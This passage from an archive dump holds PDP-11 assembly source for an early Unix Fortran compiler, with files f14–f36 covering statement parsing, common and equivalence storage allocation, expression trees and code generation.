	mov	r2,(r0)
	mov	r0,esymp
	mov	(sp)+,r3
	mov	r0,symtab+2(r3)
	rts	r5

-- /usr/source/fort/f1/f14.s mode=0100664 uid=3 gid=3 atime=174920847 mtime=174844404 --
/
/

/ f14 -- common statement
/

.globl	scomm

.globl	getsym
.globl	sdime1
.globl	error
.globl	getid
.globl	lookid

scomm:
	mov	r5,-(sp)
	jsr	r5,getsym
	cmp	r0,$6		/ / for named common
	beq	ncom
3:
	tst	r0
	bne	9f
	mov	r3,-(sp)
	clr	r5
	br	2f

ncom:
	cmpb	(r1),$'/
	bne	3f
	inc	r1
	jsr	r5,getsym
	br	3b
3:
	jsr	r5,getid
		br 9f		/ not identifier
	jsr	r5,lookid; symbuf-1
	bis	$40,symtab(r3)	/ set named common
	mov	r3,r5
	jsr	r5,getsym
	cmp	r0,$6		/ /
	bne	9f
1:
	jsr	r5,getsym
	tst	r0
	bne	9f
	mov	r3,-(sp)
2:
	jsr	r5,getsym
	cmp	r0,$32.		/ (
	bne	2f
	mov	(sp),r3
	jsr	r5,sdime1
	jsr	r5,getsym
2:
	mov	(sp)+,r3
	bit	$300,symtab(r3)	/ test param/common
	beq	2f
	jsr	r5,error; 9.	/ not commonable or already commoned
	br	3f
2:
	mov	r0,-(sp)
	mov	symtab+4(r5),r0
	beq	2f
	mov	r3,symtab+4(r0)	/ next ptr of old last block
2:
	mov	(sp)+,r0
	mov	r3,symtab+4(r5)	/ new last ptr of head block
	tst	symtab+2(r5)
	bne	3f
	mov	r3,symtab+2(r5)	/ first ptr if first block
3:
	bis	$100,symtab(r3)
	cmp	r0,$36.		/ ,
	beq	1b
	cmp	r0,$6		/ another /
	beq	ncom
	cmp	r0,$40.		/ =|
	beq	8f
9:
	jsr	r5, error; 10.	/ common syntax error
8:
	mov	(sp)+,r5
	rts	r5


-- /usr/source/fort/f1/f15.s mode=0100664 uid=3 gid=3 atime=174920849 mtime=174844408 --
/
/

/ f15 -- subroutine/function

.globl	ssubr
.globl	sfunc
.globl	sbloc
.globl	sfunc1
.globl	funok

.globl	getsym
.globl	error

ssubr:
	mov	$2,progt
	br	1f

sfunc:
	mov	$4,progt
1:
	clr	r0
	br	2f

sfunc1:
	mov	$4,progt
2:
	tst	funok
	beq	1f
	jsr	r5,error; 11.
1:
	add	$10,r0		/ class=simple
	mov	r0,-(sp)
	jsr	r5,getsym
	mov	(sp)+,r2
	tst	r0
	beq	1f
2:
	jsr	r5,error; 12.
	rts	r5
1:
	mov	r2,symtab(r3)
	jsr	r5,getsym
	cmp	r0,$32.		/ (
	beq	1f
	cmp	r0,$40.	/ eos
	bne	2b
	rts	r5
1:
	clr	-(sp)
1:
	add	$2,(sp)
	jsr	r5,getsym
	tst	r0
	beq	3f
	tst	(sp)+
	br	2b
3:
	bis	$200,symtab(r3)	/ param
	mov	(sp),symtab+6(r3)	/ param number
	jsr	r5,getsym
	cmp	r0,$36.	/ ,
	beq	1b
	tst	(sp)+
	cmp	r0,$34.		/ )
	bne	2b
	jsr	r5,getsym
	cmp	r0,$40.
	bne	2b
	rts	r5

sbloc:
	mov	$6,progt
	jsr	r5,getsym
	tst	funok
	beq	1f
	jsr	r5,error; 11.
1:
	cmp	r0,$40.
	beq	1f
	jsr	r5,error; 13.
1:
	rts	r5

.data
funok:	0
-- /usr/source/fort/f1/f16.s mode=0100664 uid=3 gid=3 atime=174920851 mtime=174844412 --
/
/

/ f16 -- extrn, equiv, data

.globl	sextr
.globl	sequi

.globl	getsym
.globl	putc
.globl	error
.globl	ptemp

sextr:
	jsr	r5,getsym
	tst	r0
	bne	1f
	bit	$70,symtab(r3)
	beq	2f
	jsr	r5,error; 14.
2:
	bis	$30,symtab(r3)
	jsr	r5,getsym
	cmp	r0,$36.		/ ,
	beq	sextr
	cmp	r0,$40.		/ eos
	beq	2f
1:
	jsr	r5,error; 15.
2:
	rts	r5

sequi:
	jsr	r5,ptemp; 'e; efno; line
	rts	r5


-- /usr/source/fort/f1/f17.s mode=0100664 uid=3 gid=3 atime=174920854 mtime=174844417 --
/
/

/ f17 -- implicit statement

.globl	simpl

.globl	getype
.globl	chrtab
.globl	error

simpl:
	jsr	r5,getype
		br 9f
	mov	r2,r1
	mov	r0,-(sp)
	movb	(r1)+,r0
	cmp	r0,$'(
	beq	1f
	cmpb	r0,$'/
	bne	8f
1:
	movb	(r1)+,r0
	cmpb	chrtab(r0),$2
	bne	8f
	cmpb	r0,$'a
	blo	2f
	sub	$6,r0		/ map 'a into 'Z+1
2:
	movb	(r1)+,r2
	cmpb	r2,$'-
	bne	2f
	movb	(r1)+,r2
	cmpb	chrtab(r2),$2
	bne	8f
	cmp	r2,$'a
	blo	3f
	sub	$6,r2		/ map 'a into 'Z+1
	br	3f
2:
	mov	r0,r2
	dec	r1
3:
	cmp	r0,r2
	bhi	8f
	asl	r0
	asl	r2
3:
	mov	(sp),imptab-[2*'A](r0)
	add	$2,r0
	cmp	r0,r2
	blos	3b
	movb	(r1)+,r0
	cmp	r0,$',
	beq	1b
	tst	(sp)+
	cmp	r0,$')
	beq	1f
	cmp	r0,$'/
	bne	9f
1:
	tstb	(r1)
	bne	simpl
	rts	r5
8:
	tst	(sp)+
9:
	jsr	r5,error; 16.	/ implicit syntax error
	rts	r5

-- /usr/source/fort/f2 mode=0140775 uid=3 gid=3 atime=174930094 mtime=174920873 --
-- /usr/source/fort/f2/f21.s mode=0100664 uid=3 gid=3 atime=174920860 mtime=174844432 --
/
/

/ f21 -- storage allocation
/

.globl	pass2

.globl	signon
.globl	signoff
.globl	calloc
.globl	salloc
.globl	equiv
.globl	entry

pass2:
	jsr	r5,signon; 2
	mov	$errb,errp
	jsr	r5,calloc
	jsr	r5,equiv
	jsr	r5,salloc
	jsr	r5,entry
	jsr	r5,signoff; 2

-- /usr/source/fort/f2/f22.s mode=0100664 uid=3 gid=3 atime=174920862 mtime=174844436 --
/
/

/ f22 -- allocate common

.globl	calloc
.globl	entry

.globl	declimpl
.globl	size
.globl	getc
.globl	getw
.globl	xbuf
.globl	code
.globl	typ

calloc:
	clr	r3
1:
	cmp	r3,symtp
	bhis	1f
	mov	symtab(r3),r0
	bic	$!70,r0		/ class
	cmp	r0,$40		/ common block
	bne	3f
	mov	r3,-(sp)
	mov	symtab+2(r3),r3
	clr	r2		/ byte offset
2:
	tst	r3
	beq	2f
	jsr	r5,declimpl
	mov	symtab+4(r3),-(sp)
	mov	2(sp),symtab+4(r3)
	mov	r2,symtab+6(r3)
	jsr	r5,size
	add	r0,r2
	mov	(sp)+,r3
	br	2b
2:
	mov	(sp)+,r3
	clr	symtab+2(r3)
	mov	r2,symtab+6(r3)		/ common block size
3:
	add	$8,r3
	br	1b
1:
	rts	r5

entry:
	mov	progt,r0
	jmp	*1f(r0)
1:
	main
	subr
	funct
	blocd

main:
	jsr	r5,code
		<main:\n\0>; .even
	rts	r5

subr:
funct:
	jsr	r5,code
		<%n.:	%n_\n\0>; .even
		8
		8
	clr	r3
1:
	cmp	r3,symtp
	bhis	1f
	mov	symtab+2(r3),r0
	beq	2f
	mov	(r0)+,r1	/ num dims
	asl	r1
	add	r0,r1		/ ptr to last dim
	mov	r3,-(sp)
	mov	(r1),-(sp)	/ dope id
	clr	r2		/ dope offset
3:
	add	$2,r2
	mov	-(r1),r3
	cmp	r0,r1
	bhi	3f
	neg	r3		/ adjustable dimension
	ble	3b
	mov	r0,-(sp)
	jsr	r5,declimpl
	mov	symtab(r3),r0
	clrb	r0
	swab	r0
	jsr	r5,code
		<	rval%dp; %n_\n\0>; .even
		r0
		r3
	mov	symtab(r3),r3
	bic	$![377\<8+7],r3
	cmp	r3,$2\<8+1		/ is it i*2
	beq	4f
	bic	$!7,r3
	movb	typ(r3),r3
	jsr	r5,code
		<	%c%di2\n\0>; .even
		r3
		r0
4:
	mov	2(sp),r0
	jsr	r5,code
		<	stst; d%d+%d.\n\0>; .even
		r0
		r2
	mov	(sp)+,r0
	br	3b
3:
	tst	(sp)+
	mov	(sp)+,r3
2:
	add	$8,r3
	br	1b
1:
blocd:
	rts	r5

-- /usr/source/fort/f2/f23.s mode=0100664 uid=3 gid=3 atime=174920865 mtime=174844441 --
/
/

/ f23 -- do equivalence statements

.globl	equiv

.globl	getsym
.globl	consub
.globl	eqvtab
.globl	error
.globl	declimpl
.globl	perror
.globl	setln
.globl	getln

/ equivalence statements, part 1
/ destroys all registers

equiv:
	jsr	r5,setln
1:
	jsr	r5,getln
		rts r5
	cmp	r0,$'e
	bne	1b
	mov	$line+11.,r1
	mov	r5,-(sp)
2:				/ start equivalence group
	cmpb	(r1)+,$'(		/ check (
	bne	9f			/ syntax error
	jsr	r5,getsym
	tst	r0
	bne	9f			/ not identifier
	mov	r3,r5
	jsr	r5,equset
	movb	(r1)+,r2
	clr	r4			/ offset
	cmp	r2,$',
	beq	3f
	cmp	r2,$'(			/ subscripted vble
	bne	9f			/ syntax error
	jsr	r5,consub		/ get subscript
	mov	r0,r4
	cmpb	(r1)+,$',
	bne	9f
3:					/ rest of group
	jsr	r5,getsym		/ next ident
	tst	r0
	bne	9f			/ syntax
	jsr	r5,equset
	clr	r0
	mov	r3,r2
	cmpb	(r1),$'(		/ subscript?
	bne	4f
	inc	r1
	jsr	r5,consub
4:
	mov	eqvtab+2(r2),r2
	cmp	r2,r5
	beq	5f			/ already in same group
	cmp	r2,r3
	bne	4b			/ not yet in different group
	sub	r4,r0			/ adjust offsets
	sub	eqvtab+4(r5),r0		/ left vble's offset
	add	eqvtab+4(r3),r0		/ new vble's offset
4:
	sub	r0,eqvtab+4(r2)
	mov	eqvtab+2(r2),r2
	cmp	r2,r3
	bne	4b
	mov	eqvtab+2(r3),r0		/ link up groups
	mov	eqvtab+2(r5),eqvtab+2(r3)
	mov	r0,eqvtab+2(r5)		/ link groups
	br	6f
5:					/ here already in same group
	cmp	r0,r4			/ offset must be same
	beq	6f
	jsr	r5,error; 23.		/ inconsistency!
6:
	movb	(r1)+,r0
	cmp	r0,$',
	beq	3b
	cmp	r0,$')
	bne	9f
	movb	(r1)+,r0
	bne	3f
	jsr	r5,perror
	mov	(sp)+,r5
	br	1b
3:
	cmp	r0,$',
	beq	2b
9:
	jsr	r5,error; 24.		/ equivalence syntax
	jsr	r5,perror
	mov	(sp)+,r5
	br	1b

/ initialize member of equivalence group

equset:
	jsr	r5,declimpl		/ declare if necessary
	mov	symtab(r3),r0
	bit	$200,r0			/ test parameter
	bne	2f
	bic	$!70,r0
	cmp	r0,$10			/ simple
	beq	1f
	cmp	r0,$20			/ array
	beq	1f
2:
	jsr	r5,error;  31.		/ non-equivalencable variable
1:
	tst	eqvtab+2(r3)		/ see if mentioned yet
	bne	1f
	mov	r3,eqvtab+2(r3)		/ points to itself
1:
	rts	r5

-- /usr/source/fort/f2/f24.s mode=0100664 uid=3 gid=3 atime=174920868 mtime=174844445 --
/
/

/ f24 -- allocate storage for non-common variables
/ called after common and equivalence have been done

.globl	salloc

.globl	eqvtab
.globl	error
.globl	declimpl
.globl	size
.globl	perror

/ destroys all registers

salloc:
	mov	r5,-(sp)
	clr	r3			/ loop over symbol table
	br	2f
1:
	add	$8.,r3			/ next variable
2:

	cmp	r3,symtp
	blo	2f
	mov	(sp)+,r5
	mov	$line,r1
	jsr	r5,perror		/ flush errors
	rts	r5
2:
	bit	$70,symtab(r3)
	beq	1b			/ unclassed
	jsr	r5,declimpl		/ just in case
	tst	eqvtab(r3)		/ test for already allocated
	bne	1b			/ yes
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$10			/ test class=simple
	beq	2f
	cmp	r0,$20			/ test array
	bne	1b			/ no, not a variable
2:
	bit	$200,symtab(r3)		/ test parameter
	bne	1b
	tst	eqvtab+2(r3)		/ test for equivalence
	bne	2f			/ yes
	bit	$100,symtab(r3)		/ test common
	bne	1b			/ yes, nothing to do
	mov	nxtaloc,symtab+6(r3)	/ offset
	jsr	r5,size			/ get byte count
	add	r0,nxtaloc
	inc	eqvtab(r3)		/ mark allocated
	br	1b
2:
	clr	r4			/ common variable of group
	mov	$77777,r1		/ infinity to smallest offset
	mov	r3,r5
2:
	cmp	eqvtab+4(r3),r1
	bgt	3f
	mov	eqvtab+4(r3),r1		/ replace smallest offset
3:
	bit	$100,symtab(r3)		/ test common
	beq	3f
	mov	r3,r4			/ yes
3:
	mov	eqvtab+2(r3),r3		/ next group member
	cmp	r3,r5
	bne	2b
	tst	r4
	bne	2f			/ *there was a common in group
				/ equivalence group w/o common
	sub	nxtaloc,r1		/ get -(group offset)
3:
	inc	eqvtab(r3)		/ mark allocated
	mov	eqvtab+4(r3),r2
	sub	r1,r2			/ compute offset
	mov	r2,symtab+6(r3)		/ enter offset
	jsr	r5,size
	add	r0,r2			/ highest loc of variable
	cmp	r2,r4
	ble	4f
	mov	r2,r4			/ extends storage
4:
	mov	eqvtab+2(r3),r3		/ next of group
	cmp	r3,r5
	bne	3b
	mov	r4,nxtaloc		/ account for space
	br	1b			/ done!
2:				/ equivalence group w/ common
	mov	symtab+6(r4),r1		/ actual common offset
	sub	eqvtab+4(r4),r1		/ virtual common offset
2:
	inc	eqvtab(r3)		/ mark allocated
	bit	$100,symtab(r3)		/ is variable already in common
	beq	3f			/ *no
	cmp	symtab+4(r4),symtab+4(r3)
	beq	4f
	jsr	r5,error; 25.		/ different blocks equiv.
4:
	mov	r1,r0
	add	eqvtab+4(r3),r0
	cmp	r0,symtab+6(r3)
	beq	4f			/ ok
	jsr	r5,error; 27.		/ same variable, different offsets
	br	4f
3:
	bis	$100,symtab(r3)		/ mark common now
	mov	symtab+4(r4),symtab+4(r3)/ get right common block
	mov	r1,r0
	add	eqvtab+4(r3),r0
	bge	3f
	jsr	r5,error; 26.		/ block extended leftward
	clr	r0
3:
	mov	r0,symtab+6(r3)		/ get proper offset
	mov	r0,-(sp)
	jsr	r5,size			/ see if size is extended
	add	(sp)+,r0
	mov	symtab+4(r3),r2		/ common block
	cmp	symtab+6(r2),r0
	bge	4f			/ ok
	mov	r0,symtab+6(r2)		/ extend size
4:
	mov	eqvtab+2(r3),r3
	cmp	r3,r5
	bne	2b
	jmp	1b

-- /usr/source/fort/f3 mode=0140775 uid=3 gid=3 atime=174930095 mtime=174920904 --
-- /usr/source/fort/f3/f31.s mode=0100664 uid=3 gid=3 atime=174920874 mtime=174844460 --
/
/

/ f31 - pass3 dispatcher
/
/	main scan loop for pass3
/	picks up executable statements
/

.globl	pass3
.globl	ifstmt

.globl	isagn
.globl	signon
.globl	signoff
.globl	getline
.globl	lookup
.globl	sasgn
.globl	error
.globl	perror
.globl	doend
.globl	sform
.globl	sdata
.globl	sdo
.globl	sassi
.globl	scall
.globl	scont
.globl	sretu
.globl	sgoto
.globl	sif
.globl	spaus
.globl	sstop
.globl	sread
.globl	sprin
.globl	swrit
.globl	srewi
.globl	sback
.globl	sendf
.globl	blocks
.globl	blockp
.globl	code
.globl	ptemp
.globl	dotabp

pass3:
	jsr	r5,signon; 3
	br	2f

scan3:
	jsr	r5,getline
2:
	mov	$blocks,blockp
	mov	$line,r1
	mov	r1,r2
	jsr	r5,lookup; fmttab
		br 2f
	mov	r0,-(sp)
	jsr	r5,isagn
		br 1f
	mov	(sp)+,r0
	jsr	r5,*fmtlst(r0)
	br	scan3
1:
	tst	(sp)+
2:
	mov	efno,r0
	beq	1f
	jsr	r5,ptemp; 's; efno; line
	jsr	r5,code
		<.%d:\n\0>; .even
		r0
1:
	jsr	r5,isagn
		br 1f
	mov	r1,r2
	jsr	r5,lookup; stmtab
		br 2f
	mov	r2,r1
	jsr	r5,*sublst(r0)
	br	3f
1:
	jsr	r5,sasgn
	br	3f
2:
	jsr	r5,error; 101.
3:
	cmp	progt,$6
	bne	1f
	jsr	r5,error; 50. / execut in block data
1:
	jsr	r5,perror
	mov	efno,r0
	beq	scan3
	jsr	r5,doend
	br	scan3

ifstmt:
	mov	$blocks,blockp
	jsr	r5,isagn
		br 1f
	mov	r1,r2
	jsr	r5,lookup; stmtab1
		br 2f
	mov	r2,r1
	cmp	r0,$4		/ don't allow end
	beq	2f
	jmp	*sublst1(r0)
1:
	jmp	sasgn
2:
	jsr	r5,error; 101.
	rts	r5

send:
	tst	dotabp
	beq	1f
	clr	r0
	jsr	r5,doend
	br	send
1:
	tst	progt
	bne	1f
	jsr	r5,sstop
	br	2f
1:
	cmp	progt,$6		/ block data
	beq	2f
	jsr	r5,sretu
2:
	jsr	r5,perror
	jsr	r5,signoff; 3

sublst:
	sdo
sublst1:
	sif
	sendf
	send
	sassi
	scall
	scont
	sretu
	sgoto
	spaus
	sstop
	sread
	sprin
	swrit
	srewi
	sback
fmtlst:
	sform
	sdata
stmtab:
	<do\0>
stmtab1:
	<if(\0>
	<endfile\0>
	<end\0>		/ keep in this spot!!!
	<assign\0>
	<call\0>
	<continue\0>
	<return\0>
	<goto\0>
	<pause\0>
	<stop\0>
	<read\0>
	<print\0>
	<write\0>
	<rewind\0>
	<backspace\0>
	<\0>

fmttab:
	<format\0>
	<data\0>
	<\0>
	.even

-- /usr/source/fort/f3/f32.s mode=0100664 uid=3 gid=3 atime=174920877 mtime=174844465 --
/
/

/ f32 -- expression to tree

.globl	e1
.globl	e2
.globl	e11

.globl	error
.globl	getsym
.globl	blockp
.globl	blocks
.globl	declimpl
.globl	conu
.globl	ptemp
.globl	functn
.globl	funimpl

/	e1:	e2[,e1]
/	e2:	e2[.or.e3]
/	e3:	e3[.and.e4]
/	e4:	[.not.]e5
/	e5:	e6[.rel.e6]
/	e6:	[+-]e7[+-e6]
/	e7:	e7[*/e8]
/	e8:	e9[**e9]
/	e9:	constant
/		name[(e1)]
/		(e2)
e1:
	jsr	r5,e2
	cmp	r0,$36.		/ ,
	bne	1f
	jsr	r5,block; e1
	rts	r5

e2:
	jsr	r5,e3
2:
	cmp	r0,$30.		/ or
	bne	1f
	jsr	r5,block; e3
	br	2b

e3:
	jsr	r5,e4
2:
	cmp	r0,$28.		/ and
	bne	1f
	jsr	r5,block; e4
	br	2b

e4:
	jsr	r5,getsym
	cmp	r0,$26.		/ not
	bne	e5
	clr	r2
	jsr	r5,block; e5a
	rts	r5

e5a:
	jsr	r5,getsym
e5:
	jsr	r5,e6
	cmp	r0,$14.	/ .lt.
	blo	1f
	cmp	r0,$24.	/ .ge.
	bhi	1f
	jsr	r5,block; e6a
	rts	r5

e6a:
	jsr	r5,getsym
e6:
	cmp	r0,$12.		/ +
	beq	e6a
	cmp	r0,$10.		/ -
	bne	2f
	clr	r2
	jsr	r5,block; e7a
	br	3f
2:
	jsr	r5,e7
3:
	cmp	r0,$10.		/ -
	blo	1f
	cmp	r0,$12.		/ +
	bhi	1f
	jsr	r5,block; e7a
	br	3b

e7a:
	jsr	r5,getsym
e7:
	jsr	r5,e8
2:
	cmp	r0,$6.		/ /
	blo	1f
	cmp	r0,$8.		/ *
	bhi	1f
	jsr	r5,block; e8a
	br	2b

e8a:
	jsr	r5,getsym
e8:
	jsr	r5,e9
	cmp	r0,$4		/ **
	bne	1f
	jsr	r5,block; e9a
1:
	rts	r5

e9a:
	jsr	r5,getsym
e9:
	cmp	r0,$2		/ constant
	beq	3f
/ (e2)
	cmp	r0,$32.		/ (
	bne	1f
	jsr	r5,e2
	br	2f
e10:
	jsr	r5,e1
2:
	cmp	r0,$34.	/ )
	beq	2f
	jsr	r5,error; 29.
	rts	r5
2:
	jsr	r5,getsym
	rts	r5
1:
	tst	r0
	beq	e11
/ unknown
	jsr	r5,error; 30.
	rts	r5

/ name
e11:
	mov	r3,r2
	jsr	r5,getsym
	cmp	r0,$32.		/ (
	bne	1f
	jsr	r5,appl
	jsr	r5,block; e10
	rts	r5
1:
	mov	r2,r3
	mov	r0,-(sp)
	jsr	r5,declimpl
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$30			/ class =| funct
	bne	1f
	jsr	r5,appl
	mov	$42.,r3			/ just function name
	br	2f
1:
	clr	r3
2:
	mov	(sp)+,r0
	mov	r2,-(sp)
	mov	blockp,r2
	add	$6,blockp
	mov	r3,(r2)
	mov	(sp)+,2(r2)
	clr	4(r2)
	rts	r5

/ number
3:
	mov	blockp,r2
	add	$6,blockp
	mov	r0,(r2)
	mov	r3,2(r2)
	cmpb	2(r2),$5		/ const->int
	bne	4f
	movb	$1,2(r2)
4:
	mov	r3,temp
	mov	conu,4(r2)
	inc	conu
	jsr	r5,ptemp; 'c; temp; symbuf
	jsr	r5,getsym
	rts	r5

appl:
	clr	functn
	bit	$70,symtab(r2)		/ class
	bne	1f
	bis	$30,symtab(r2)
	jsr	r5,funimpl
1:
	mov	r2,r3
	jsr	r5,declimpl
	mov	symtab(r2),r0
	bic	$!70,r0			/ class again
	cmp	r0,$20		/ array
	beq	1f
	cmp	r0,$30		/ funct
	beq	2f
	jsr	r5,error; 33.
	bic	$70,symtab(r2)
	br	appl
1:
	mov	$32.,r0
	rts	r5
2:
	mov	$34.,r0
	rts	r5

block:
	mov	blockp,r3
	add	$6,blockp
	mov	r0,(r3)+
	mov	r2,(r3)+
	mov	r3,-(sp)
	jsr	r5,*(r5)+
	mov	r2,*(sp)
	mov	(sp)+,r2
	sub	$4,r2
	rts	r5

-- /usr/source/fort/f3/f33.s mode=0100664 uid=3 gid=3 atime=174920880 mtime=174844470 --
/
/

/ f33 -- do, etal

.globl	sdo
.globl	dobeg
.globl	doend

.globl	getlab
.globl	e2
.globl	error
.globl	lvalue
.globl	rvalue
.globl	code
.globl	convrt
.globl	dou
.globl	dotabp
.globl	edotab
.globl	dotab

sdo:
	jsr	r5,getlab
		br 9f
	jsr	r5,dobeg
	cmp	r0,$40.
	bne	9f
	rts	r5

7:
	tst	(sp)+
8:
	tst	(sp)+
9:
	jsr	r5,error; 42.
	rts	r5

dobeg:
	mov	dotabp,r2
	cmp	r2,$edotab
	blo	1f
	jsr	r5,error; 44.
	rts	r5
1:
	mov	dou,dotab(r2)
	inc	dou
	mov	r0,dotab+2(r2)
	add	$4,dotabp
	jsr	r5,e2
	cmp	r0,$38.		/ =
	bne	9b
	mov	r2,-(sp)
	jsr	r5,lvalue
	mov	r3,-(sp)
	bic	$!7,r3
	cmp	r3,$1		/ integer
	bne	7b
	jsr	r5,e2
	cmp	r0,$36.		/ ,
	bne	7b
	jsr	r5,rvalue
	mov	(sp),r2
	jsr	r5,convrt
	mov	(sp),r3
	clrb	r3
	swab	r3
	jsr	r5,code
		<	gas%d\n	goto; 2f\n\0>; .even
		r3
	mov	dotabp,r2
	mov	dotab-4(r2),r0
	jsr	r5,code
		<t%d:\n\0>; .even
		r0
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	r0,-(sp)
	mov	r3,-(sp)
	jsr	r5,lvalue
	jsr	r5,e2
	mov	r0,-(sp)
	jsr	r5,rvalue
	mov	2(sp),r2
	jsr	r5,convrt
	cmp	(sp)+,$36.		/ ,
	bne	1f
	jsr	r5,e2
	mov	r0,-(sp)
	jsr	r5,rvalue
	mov	2(sp),r2
	jsr	r5,convrt
	mov	(sp)+,r0
	jsr	r5,code
		<	do2\0>; .even
	br	2f
1:
	jsr	r5,code
		<	do1\0>; .even
2:
	mov	(sp)+,r3
	clrb	r3
	swab	r3
	mov	(sp)+,r2
	jsr	r5,code
		<%d; o%d\n2:\n\0>; .even
		r3
		r2
	rts	r5

doend:
	tst	r0
	bne	1f
	jsr	pc,gen
	rts	r5
1:
	clr	r2
1:
	cmp	r2,dotabp
	bhis	1f
	add	$4,r2
	cmp	r0,dotab-2(r2)
	bne	1b
	jsr	pc,gen
	br	doend
1:
	rts	r5

gen:
	mov	r0,-(sp)
	mov	dotabp,r2
	cmp	r0,dotab-2(r2)
	beq	1f
	jsr	r5,error; 43.
1:
	mov	dotab-4(r2),r0
	sub	$4,dotabp
	jsr	r5,code
		<	goto; t%d\no%d:\n\0>; .even
		r0
		r0
	mov	(sp)+,r0
	rts	pc

-- /usr/source/fort/f3/f34.s mode=0100664 uid=3 gid=3 atime=174920882 mtime=174844474 --
/
/

/ f34 -- if statement

.globl	sif

.globl	e2
.globl	error
.globl	rvalue
.globl	code
.globl	ifstmt
.globl	iserror
.globl	getsym
.globl	geti
.globl	genop
.globl	getlab
.globl	newline

sif:
	jsr	r5,e2			/ expression
	jsr	r5,iserror
		br 9f
	cmp	r0,$34.			/ )
	bne	9f
	jsr	r5,rvalue
	mov	$"if,r0
	jsr	r5,genop
	bic	$!7,r3
	cmp	r3,$3			/ logical
	bne	1f
	jsr	r5,code
		<; 1f\n\0>; .even
	jsr	r5,ifstmt
	jsr	r5,code
		<1:\n\0>; .even
	rts	r5
1:
	mov	$3,-(sp)
1:
	jsr	r5,getlab
		br 8f
	jsr	r5,code
		<; .%d\0>; .even
		r0
	dec	(sp)
	beq	1f
	jsr	r5,getsym
	cmp	r0,$36.
	beq	1b
8:
	tst	(sp)+
	br	9f
1:
	tst	(sp)+
	jsr	r5,newline
	jsr	r5,getsym
	cmp	r0,$40.
	bne	9f
	rts	r5

9:
	jsr	r5,error; 40.
	rts	r5

-- /usr/source/fort/f3/f35.s mode=0100664 uid=3 gid=3 atime=174920884 mtime=174844479 --
/
/

/ f35 -- assignment statement

.globl	sasgn
.globl	sassi

.globl	error
.globl	e2
.globl	lvalue
.globl	rvalue
.globl	code
.globl	convrt
.globl	geti
.globl	getsym
.globl	getlab
.globl	genop
.globl	newline
.globl	name

sasgn:
	jsr	r5,e2
	cmp	r0,$38.		/ =
	bne	9f
	mov	r2,-(sp)
	jsr	r5,e2
	cmp	r0,$40.		/ =|
	bne	8f
	tst	*(sp)
	bne	1f			/ too hard for simple as
	jsr	r5,rvalue
	mov	(sp)+,r2
	mov	2(r2),r2
	mov	r2,-(sp)
	mov	symtab(r2),r2
	jsr	r5,convrt
	mov	r2,r3
	bis	$7,r3
	mov	$"mv,r0
	jsr	r5,genop
	mov	(sp)+,r3
	jsr	r5,name
	rts	r5
1:
	mov	r2,r3
	mov	(sp)+,r2
	mov	r3,-(sp)
	jsr	r5,lvalue
	mov	(sp)+,r2
	mov	r3,-(sp)
	jsr	r5,rvalue
1:
	mov	(sp)+,r2
	jsr	r5,convrt
	mov	r2,r3
	bis	$7,r3		/ type 'g'
	mov	$"as,r0
	jsr	r5,genop
	jsr	r5,newline
	rts	r5

sassi:
	jsr	r5,getlab
		br 9f
	mov	r0,-(sp)
	cmpb	(r1)+,$'t
	bne	8f
	cmpb	(r1)+,$'o
	bne	8f
	jsr	r5,e2
	cmp	r0,$40.			/ =|
	bne	8f
	jsr	r5,lvalue
	mov	(sp)+,r0
	mov	r3,-(sp)
	jsr	r5,code
		<	lval; .%d\n\0>; .even
		r0
	mov	$int2con,r3
	br	1b
8:
	tst	(sp)+
9:
	jsr	r5,error; 39.
	rts	r5

-- /usr/source/fort/f3/f36.s mode=0110664 uid=3 gid=3 atime=174920888 mtime=174844484 --
/
/

/ f36 -- expression code generation

.globl	lvalue
.globl	rvalue
.globl	convrt
.globl	type
.globl	funcappl
.globl	name

.globl	error
.globl	lookup
.globl	code
.globl	iserror
.globl	genop
.globl	typ
.globl	newline
.globl	functn
.globl	size

lvalue:
	jsr	r5,iserror
		rts r5
	tst	(r2)
	bne	1f
	mov	2(r2),r3
	jsr	r5,code
		<	lval>; .even
	br	name
1:
	mov	r2,-(sp)
	cmp	(r2),$32.		/ array appl
	bne	1f
	jsr	r5,aryappl
	dec	r0
	bne	2f			/ dim =| 1
	tstb	symtab(r3)
	blt	2f			/ p-bit, not simple
	mov	$"al,r0
	br	simpary
2:
	jsr	r5,code
		<	alval\0>; .even

arydope:
	jsr	r5,pbit
	mov	symtab+2(r3),r2
	mov	(r2)+,r0
	asl	r0
	add	r0,r2
	mov	(r2),r0
	jsr	r5,code
		<; d%d\0>; .even
		r0
	br	2f
1:
	jsr	r5,error; 54.
	mov	(sp)+,r2
	rts	r5

simpary:
	mov	r3,-(sp)
	mov	symtab(r3),r3
	bis	$7,r3
	jsr	r5,genop
	mov	(sp)+,r3
	jsr	r5,size
	jsr	r5,code
		<; %d.\0>; .even
		r0
	br	2f

name:
	mov	r2,-(sp)
	jsr	r5,pbit
2:
	jsr	r5,code
		<; \0>; .even
	bit	$100,symtab(r3)		/ common
	beq	1f
	mov	symtab+4(r3),r2
	jsr	r5,code
		<%n+\0>; .even
		r2
1:
	movb	symtab(r3),r2
	bic	$!70,r2
	cmp	r2,$30			/ external
	bne	1f
	jsr	r5,code
		<%n.\n\0>; .even
		r3
	br	2f
1:
	jsr	r5,code
		<%n_\n\0>; .even
		r3
2:
	mov	symtab(r3),r3
	mov	(sp)+,r2
	rts	r5

rvalue:
	jsr	r5,iserror
		rts r5
	mov	r2,-(sp)
	tst	(r2)
	bne	1f
	mov	2(r2),r3
	movb	symtab+1(r3),r2
	jsr	r5,code
		<	rval%d>; .even
		r2
	mov	(sp)+,r2
	br	name
1:
	cmp	(r2),$32.
	bne	1f
	jsr	r5,aryappl
	dec	r0
	bne	3f
	tstb	symtab(r3)
	blt	3f
	mov	$"ar,r0
	br	simpary
3:
	jsr	r5,code
		<	arval\0>; .even
	br	arydope
1:
	cmp	(r2),$34.		/ array appl
	bne	1f
	jsr	r5,funcappl
	mov	(sp)+,r2
	mov	2(r2),r3
	movb	symtab+1(r3),r0
	jsr	r5,code
		<%d.\n\0>; .even
		r0
	mov	symtab(r3),r3
	rts	r5
1:
	cmp	(r2),$2
	bne	1f
	movb	3(r2),r3
	mov	4(r2),r2
	jsr	r5,code
		<	rval%d; c%d\n\0>; .even
		r3
		r2
	mov	(sp)+,r2
	mov	2(r2),r3
	rts	r5
1:
	cmp	(r2),$24.		/ arith or relat
	bhi	1f
	mov	2(r2),r2
	bne	3f
	mov	(sp),r2
	sub	$10.,(r2)		/ - bin -> - unary
